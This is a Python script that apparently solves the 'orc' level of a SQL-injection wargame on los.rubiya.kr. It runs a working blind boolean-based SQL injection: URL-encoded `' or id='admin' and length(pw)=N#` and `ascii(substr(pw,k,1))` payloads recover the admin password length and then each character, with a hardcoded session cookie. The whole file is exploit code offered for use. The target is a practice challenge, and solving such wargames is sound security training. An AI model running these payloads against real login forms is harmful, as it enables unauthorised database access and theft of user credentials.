import urllib3
import requests
import time

flag = ""
length = 1
result = ""

session = dict(PHPSESSID="i46ph67fvj0rfi4ij9iri04ih5")

# find the length of PassWord
for i in range(0, 20):
    try:
        r = requests.post("https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=asd%27%20or%20id=%27admin%27%20and%20length(pw)="+str(i)+"%23", cookies=session)
    except:
        print("exception_length")
        continue

    if 'Hello admin' in r.text:
        length = i
        break

print("[+] Length of admin PW : " + str(length))
print("[+] ----------------------------------------[+]")


for k in range(1, length+1):
    for j in range(48, 126):
        try:
            r = requests.post("https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=asd%27%20or%20id=%27admin%27%20and%20ascii(substr(pw,"+ str(k) +",1))="+str(j)+"%23", cookies=session)
        except:
            print("exception_flag")
            continue
        if 'Hello admin' in r.text:
            flag = flag + chr(j)
            print("[+] finding PW : " + flag, j)
        time.sleep(0.1)

result = flag.lower()
print("[+] pw of admin : " + result)